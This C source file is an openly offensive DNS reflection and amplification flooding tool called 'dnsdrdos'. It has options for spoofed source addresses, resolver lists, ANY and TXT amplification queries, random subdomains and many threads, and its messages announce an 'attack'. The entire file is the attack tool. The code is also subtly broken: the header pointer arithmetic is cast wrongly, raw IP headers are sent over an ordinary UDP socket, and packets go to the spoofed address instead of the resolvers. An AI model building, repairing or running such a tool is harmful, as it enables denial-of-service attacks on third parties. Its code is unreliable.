#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdint.h>
#include <errno.h>
#include <netdb.h>

#define VERSION         "v3.0.0-SUPER   (2026.05.25)"
#define ATOI(x)         strtol((x), (char **)NULL, 10)
#define MAX_LINE        512
#define DFLT_THREADS    4
#define DFLT_QB         42
#define DFLT_DPORT      53
#define DFLT_TTL        255
#define DEFAULT_TARGET  "8.8.8.8"
#define RAND_LEN        6
#define DFLT_LOOP       100
#define MAX_NSRV        8192

#define RR_A             1
#define RR_TXT           16
#define RR_ANY           255

#define F_DNSSEC         0x001
#define F_VERBOSE        0x008
#define F_DOMRND         0x040
#define F_STATS          0x020

#define __ERR_GEN(fmt, ...) do { fprintf(stderr, "[-] ERROR %s:%d: " fmt "\n", __func__, __LINE__, ## __VA_ARGS__); exit(EXIT_FAILURE); } while(0)
#define _EXIT_OK exit(EXIT_SUCCESS)

static volatile sig_atomic_t _keep_running = 1;

#define C_OFF   "\033[0m"
#define C_GR    "\033[32m"
#define C_BL    "\033[1m"
#define C_RD    "\033[31m"

#define LG(fmt,...) do { \
    if (isatty(STDOUT_FILENO)) printf(C_BL "[" "dnsdrdos" C_OFF "] " fmt C_OFF "\n", ## __VA_ARGS__); \
    else printf("[" "dnsdrdos" "] " fmt "\n", ## __VA_ARGS__); \
} while(0)

typedef struct {
    uint16_t id;
    uint8_t rd:1;
    uint8_t tc:1;
    uint8_t aa:1;
    uint8_t opcode:4;
    uint8_t qr:1;
    uint8_t rcode:4;
    uint8_t cd:1;
    uint8_t ad:1;
    uint8_t z:1;
    uint8_t ra:1;
    uint16_t q_count;
    uint16_t ans_c;
    uint16_t auth_c;
    uint16_t add_c;
} dns_hdr_t;

typedef struct {
    uint16_t qtype;
    uint16_t qclass;
} dns_query_t;

typedef struct {
    int naddr;
    char *saddr;
    char *daddr;
    uint16_t rtype;
    int pkt_len;
    int threads;
    uint16_t dport;
    uint32_t flags;
    uint32_t tid;
    int loops;
    uint8_t ttl;
    int pkt_id;
    void *buf;
} conf_t;

typedef struct {
    pthread_t thread;
    uint64_t pkts_sent;
    uint64_t bytes_sent;
    uint32_t errors;
    uint32_t tid;
} thread_stat_t;

static thread_stat_t tstats[1024];
static uint32_t g_max_threads = 0;
static struct timespec g_start_time;

static void *xmalloc(size_t size)
{
    void *b = malloc(size);
    if (!b) __ERR_GEN("xmalloc(%zu) failed", size);
    return b;
}

static int xsocket(int domain, int type, int proto)
{
    int fd = socket(domain, type, proto);
    if (fd == -1) __ERR_GEN("socket(%d,%d,%d)=%d: %m", domain, type, proto, errno);
    return fd;
}

static void sig_handler(int sig)
{
    (void)sig;
    _keep_running = 0;
}

static char *rand_substr(void)
{
    static char buf[256];
    static const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    static int init = 0;
    if (!init) { srand((unsigned int)time(NULL)); init = 1; }
    for (int i = 0; i < RAND_LEN; i++)
        buf[i] = chars[rand() % (sizeof(chars) - 1)];
    buf[RAND_LEN] = '\0';
    return buf;
}

static void read_namesrvs(const char *file, int64_t *naddr, char ***addrs)
{
    FILE *fp = fopen(file, "r");
    if (!fp) {
        LG("Warning: Cannot open '%s', using 8.8.8.8", file);
        *naddr = 1;
        *addrs = (char**)xmalloc(sizeof(char*) * 2);
        (*addrs)[0] = xmalloc(64);
        snprintf((*addrs)[0], 64, "8.8.8.8");
        (*addrs)[1] = NULL;
        return;
    }
    char *entries[MAX_NSRV];
    char line[MAX_LINE];
    int count = 0;
    while (fgets(line, sizeof(line), fp) && count < MAX_NSRV) {
        char *p = line;
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') p++;
        if (*p == '#' || *p == '\0') continue;
        size_t len = strlen(p);
        while (len > 0 && (p[len-1] == '\n' || p[len-1] == '\r')) p[--len] = '\0';
        if (len == 0) continue;
        entries[count] = xmalloc(len + 1);
        snprintf(entries[count], len + 1, "%s", p);
        count++;
    }
    fclose(fp);
    *naddr = (int64_t)count;
    *addrs = (char**)NULL;
    if (count > 0) {
        *addrs = (char**)xmalloc(sizeof(char*) * ((size_t)count + 1));
        for (int i = 0; i < count; i++) (*addrs)[i] = entries[i];
        (*addrs)[count] = NULL;
    }
}

static int build_pkt(conf_t *c, const char *domain, uint16_t dport)
{
    const char *target = (domain != NULL && domain[0] != '\0') ? domain : "google.com.";

    const size_t pkt_sz = 1500;
    memset(c->buf, 0, pkt_sz);

    /* Packet layout: [IPhdr][Udphdr][DNShdr][DNSquery][DNSlabel...] */
    struct iphdr *ip = (struct iphdr *)(uint8_t *)c->buf;
    struct udphdr *udp = (struct udphdr *)(uint8_t *)c->buf + sizeof(*ip);
    dns_hdr_t *dh = (dns_hdr_t *)(uint8_t *)c->buf + sizeof(*ip) + sizeof(*udp);
    dns_query_t *dq = (dns_query_t *)(uint8_t *)c->buf + sizeof(*ip) + sizeof(*udp) + sizeof(*dh);

    /* IP header */
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->ttl = c->ttl;
    ip->id = (uint16_t)(c->pkt_id & 0xFFFF);
    ip->frag_off = 0;
    ip->protocol = 17;
    ip->saddr = c->saddr ? inet_addr(c->saddr) : (uint32_t)htonl(0x0100007F);
    ip->daddr = inet_addr(c->daddr);

    /* UDP header */
    uint32_t sport = c->tid * 8192u + (c->pkt_id & 0xFFFF);
    udp->source = htons((uint16_t)(sport & 0xFFFF));
    udp->dest = htons(dport);

    /* DNS header */
    memset(dh, 0, sizeof(*dh));
    dh->id = (uint16_t)(c->pkt_id & 0xFFFF);
    dh->rd = 1;
    dh->opcode = 0;
    dh->q_count = htons(1);

    /* DNS query section */
    uint16_t qtype = c->rtype;
    if (c->flags & F_DNSSEC) qtype = RR_ANY;
    dq->qtype = htons(qtype);
    dq->qclass = htons(1);

    /* Domain label encoding */
    uint8_t *d = (uint8_t *)dq + sizeof(*dq);
    {
        char tmp[256];
        snprintf(tmp, sizeof(tmp), "%s", target);
        char *tok = strtok(tmp, ".");
        while (tok) {
            int tlen = (int)strlen(tok);
            if (tlen > 0) {
                *d++ = (uint8_t)tlen;
                memcpy(d, tok, (size_t)tlen);
                d += tlen;
            }
            tok = strtok(NULL, ".");
        }
    }
    *d++ = 0; /* DNS root label */

    /* Calculate lengths */
    int domain_end = (int)(d - (uint8_t *)c->buf);
    int udp_len = (int)(sizeof(*dh) + sizeof(*dq) + (d - ((uint8_t *)dq + sizeof(*dq))));
    int ip_len = (int)(sizeof(*ip) + udp_len);

    udp->len = htons((uint16_t)udp_len);
    ip->tot_len = htons((uint16_t)ip_len);

    return domain_end;
}

typedef struct {
    conf_t *c;
    const char *domain;
    int tid;
} worker_arg_t;

static void *attack_worker(void *arg)
{
    worker_arg_t *wa = (worker_arg_t *)arg;
    conf_t *c = wa->c;
    int tid = wa->tid;
    const char *domain = wa->domain;

    int sock = xsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = c->saddr ? inet_addr(c->saddr) : inet_addr("8.8.8.8");
    dest.sin_port = htons(c->dport);

    uint64_t pkts = 0;
    uint64_t byts = 0;
    char domain_buf[256];

    for (int i = 0; i < c->loops && _keep_running; i++) {
        const char *dm = domain;
        if (c->flags & F_DOMRND) {
            char randstr[256];
            snprintf(randstr, sizeof(randstr), "%s.", rand_substr());
            snprintf(domain_buf, sizeof(domain_buf), "%s%s", randstr, domain);
            dm = domain_buf;
        }
        int plen = build_pkt(c, dm, c->dport);

        int ret = (int)sendto(sock, c->buf, (size_t)plen, 0,
                              (struct sockaddr *)&dest, sizeof(dest));
        if (ret < 0) {
            tstats[tid].errors++;
        } else {
            tstats[tid].pkts_sent++;
            pkts++;
            tstats[tid].bytes_sent += (uint64_t)ret;
            byts += (uint64_t)ret;
        }
        c->pkt_id++;
    }
    close(sock);
    tstats[tid].pkts_sent = pkts;
    tstats[tid].bytes_sent = byts;
    free(wa);
    return NULL;
}

static void stats_print(void)
{
    uint64_t total_pkts = 0, total_bytes = 0, total_errs = 0;
    for (int t = 0; t < g_max_threads; t++) {
        total_pkts += tstats[t].pkts_sent;
        total_bytes += tstats[t].bytes_sent;
        total_errs += tstats[t].errors;
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    float elapsed = (float)(now.tv_sec - g_start_time.tv_sec) + (float)(now.tv_nsec - g_start_time.tv_nsec) / 1e9f;
    if (elapsed < 0.1f) elapsed = 0.1f;
    double bps = (double)total_bytes * 8.0 / elapsed;
    double pps = (double)total_pkts / elapsed;
    char speed[64];
    if (bps >= 1e9) snprintf(speed, sizeof(speed), "%.2f Gb/s", bps / 1e9);
    else if (bps >= 1e6) snprintf(speed, sizeof(speed), "%.2f Mb/s", bps / 1e6);
    else if (bps >= 1e3) snprintf(speed, sizeof(speed), "%.2f Kb/s", bps / 1e3);
    else snprintf(speed, sizeof(speed), "%.0f b/s", bps);
    printf("\r\033[K" C_BL "[dnsdrdos" C_OFF "] t:%u pkts:%llu %s pps:%.0f errs:%llu ",
           g_max_threads, (unsigned long long)total_pkts, speed, pps, (unsigned long long)total_errs);
    fflush(stdout);
}

static void usage(void)
{
    printf("dnsdrdos " VERSION "\n\n");
    printf("Usage: ./dnsdrdos [options]\n\n");
    printf("Options:\n");
    printf("  -f <file>    DNS server list (one IP per line)\n");
    printf("  -s <addr>    Spoofed source address\n");
    printf("  -d <domain>  Target domain for DNS query (default: google.com.)\n");
    printf("  -l <loops>   Packets per thread (default: %d)\n", DFLT_LOOP);
    printf("  -t <threads> Number of threads (default: %d)\n", DFLT_THREADS);
    printf("  -P <port>    Target DNS port (default: %d)\n", DFLT_DPORT);
    printf("  -m           TXT amplification mode (RR_TXT)\n");
    printf("  -v           Verbose mode - real-time stats\n");
    printf("  -D           DNSSEC - query type ANY with DO-bit\n");
    printf("  -n           Domain randomization (random subdomain labels)\n");
    printf("  -4           Force IPv4\n");
    printf("  -6           Force IPv6\n");
    printf("  -h           Show this help\n");
    printf("  -V           Show version\n\n");
    printf("Example:\n");
    printf("  ./dnsdrdos -f ns.txt -s 192.168.1.100 -d example.com -t 8 -l 5000 -v\n");
    printf("  ./dnsdrdos -s 10.0.0.5 -d amazon.com -t 32 -l 10000 -D -n -v -m\n");
    exit(0);
}

int main(int argc, char **argv)
{
    conf_t c;
    char domain[256] = "google.com.";
    char **addrs = NULL;
    int64_t naddr = 4;
    int opt_ch;

    memset(&c, 0, sizeof(c));
    c.threads = DFLT_THREADS;
    c.dport = DFLT_DPORT;
    c.pkt_len = DFLT_QB;
    c.ttl = DFLT_TTL;
    c.pkt_id = 1;
    c.saddr = xmalloc(64);
    snprintf(c.saddr, 64, "127.0.0.1");
    c.daddr = xmalloc(64);
    snprintf(c.daddr, 64, DEFAULT_TARGET);
    c.rtype = RR_A;
    c.loops = DFLT_LOOP;
    c.buf = xmalloc(4096);

    memset(tstats, 0, sizeof(tstats));

    /* Signal handlers */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sig_handler;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGHUP, &sa, NULL);

    /* Parse options */
    while ((opt_ch = getopt(argc, argv, "f:s:d:l:t:m:p:P:nvD46hV")) != -1) {
        switch (opt_ch) {
        case 'f':
            read_namesrvs(optarg, &naddr, &addrs);
            c.naddr = (int)naddr;
            if (addrs && addrs[0]) {
                free(c.saddr);
                c.saddr = xmalloc(64);
                snprintf(c.saddr, 64, "%s", addrs[0]);
            }
            break;
        case 's':
            free(c.saddr);
            c.saddr = xmalloc(64);
            snprintf(c.saddr, 64, "%s", optarg);
            break;
        case 'd':
            snprintf(domain, sizeof(domain), "%s", optarg);
            break;
        case 'l': {
            int v = ATOI(optarg);
            c.loops = (v > 0) ? v : DFLT_LOOP;
            break;
        }
        case 't': {
            int v = ATOI(optarg);
            c.threads = (v > 0 && v <= 1024) ? v : DFLT_THREADS;
            break;
        }
        case 'm':
            c.rtype = RR_TXT;
            break;
        case 'p':
            break;
        case 'P': {
            int v = ATOI(optarg);
            c.dport = (v > 0 && v < 65536) ? (uint16_t)v : DFLT_DPORT;
            break;
        }
        case 'n':
            c.flags |= F_DOMRND;
            break;
        case 'v':
            c.flags |= F_VERBOSE | F_STATS;
            break;
        case 'D':
            c.flags |= F_DNSSEC;
            break;
        case '4':
            break;
        case '6':
            c.flags |= 0x0042;
            break;
        case 'h':
            usage();
        case 'V':
            puts(VERSION);
            _EXIT_OK;
        default:
            usage();
        }
    }

    clock_gettime(CLOCK_MONOTONIC, &g_start_time);

    printf(C_BL "  ___)__( )__) (_)(_)  (_)(__)(__) " VERSION C_OFF "\n\n");
    LG("Starting attack");
    LG("Target: %s:%d | Domain: %s | Threads: %d | Loops/T: %d",
       c.saddr ? c.saddr : "127.0.0.1", c.dport, domain, c.threads, c.loops);
    if (c.flags & F_DOMRND)  LG("Domain randomization: ENABLED");
    if (c.flags & F_DNSSEC)  LG("DNSSEC: ENABLED");
    if (c.flags & F_VERBOSE) LG("Verbose/stats mode: ENABLED");

    g_max_threads = (uint32_t)c.threads;

    /* Launch thread pool */
    LG("Launching %d attack threads...", c.threads);

    pthread_t *threads = (pthread_t*)xmalloc((size_t)c.threads * sizeof(pthread_t));
    worker_arg_t **wa_list = (worker_arg_t**)xmalloc((size_t)c.threads * sizeof(worker_arg_t*));

    for (int t = 0; t < c.threads; t++) {
        worker_arg_t *wa = (worker_arg_t*)xmalloc(sizeof(worker_arg_t));
        wa->c = &c;
        wa->domain = domain;
        wa->tid = t;
        wa_list[t] = wa;
        c.tid = (uint32_t)t;
        pthread_create(&threads[t], NULL, attack_worker, wa);
    }

    /* Stats display loop - runs until all threads finish or Ctrl-C */
    if (c.flags & F_STATS) {
        time_t last_update = 0;
        int all_done = 0;
        while (!_keep_running || !all_done) {
            usleep(100000);
            /* Check if all threads finished by comparing total sent to expected */
            int expected = c.threads * c.loops;
            uint64_t total = 0;
            for (int t = 0; t < c.threads; t++) total += tstats[t].pkts_sent;
            if (total >= expected) all_done = 1;
            if (total > 0) {
                time_t now = time(NULL);
                if (now - last_update >= 1) {
                    last_update = now;
                    stats_print();
                }
            }
        }
        printf("\n");
    }

    /* Wait for all threads */
    for (int t = 0; t < c.threads; t++) {
        pthread_join(threads[t], NULL);
    }

    free(threads);
    for (int t = 0; t < c.threads; t++) free(wa_list[t]);
    free(wa_list);

    /* Final stats */
    uint64_t total_pkts = 0, total_bytes = 0, total_errs = 0;
    for (int t = 0; t < c.threads; t++) {
        total_pkts += tstats[t].pkts_sent;
        total_bytes += tstats[t].bytes_sent;
        total_errs += tstats[t].errors;
    }

    struct timespec end_time;
    clock_gettime(CLOCK_MONOTONIC, &end_time);
    float elapsed = (float)(end_time.tv_sec - g_start_time.tv_sec) +
                    (float)(end_time.tv_nsec - g_start_time.tv_nsec) / 1e9f;
    if (elapsed < 0.01f) elapsed = 0.01f;
    double bps = (double)total_bytes * 8.0 / elapsed;
    double pps = (double)total_pkts / elapsed;
    double elapsed_d = (double)elapsed;

    printf("\n\n[" C_BL "dnsdrdos" C_OFF "] === ATTACK RESULTS ===\n");
    printf("[" C_BL "dnsdrdos" C_OFF "] Total packets:     %llu\n", (unsigned long long)total_pkts);
    printf("[" C_BL "dnsdrdos" C_OFF "] Total bytes:       %llu\n", (unsigned long long)total_bytes);
    printf("[" C_BL "dnsdrdos" C_OFF "] Total errors:      %llu\n", (unsigned long long)total_errs);
    printf("[" C_BL "dnsdrdos" C_OFF "] Duration:          %.2f seconds\n", elapsed_d);

    if (bps >= 1e9) printf("[" C_BL "dnsdrdos" C_OFF "] Bandwidth:         %.2f Gb/s\n", bps / 1e9);
    else if (bps >= 1e6) printf("[" C_BL "dnsdrdos" C_OFF "] Bandwidth:         %.2f Mb/s\n", bps / 1e6);
    else if (bps >= 1e3) printf("[" C_BL "dnsdrdos" C_OFF "] Bandwidth:         %.2f Kb/s\n", bps / 1e3);
    else printf("[" C_BL "dnsdrdos" C_OFF "] Bandwidth:         %.0f b/s\n", bps);

    printf("[" C_BL "dnsdrdos" C_OFF "] Pkt/s:             %.0f\n", pps);
    printf("[" C_BL "dnsdrdos" C_OFF "] Done.\n" C_OFF);

    free(c.saddr);
    free(c.daddr);
    if (addrs) {
        for (int i = 0; addrs[i]; i++) free(addrs[i]);
        free(addrs);
    }

    return 0;
}
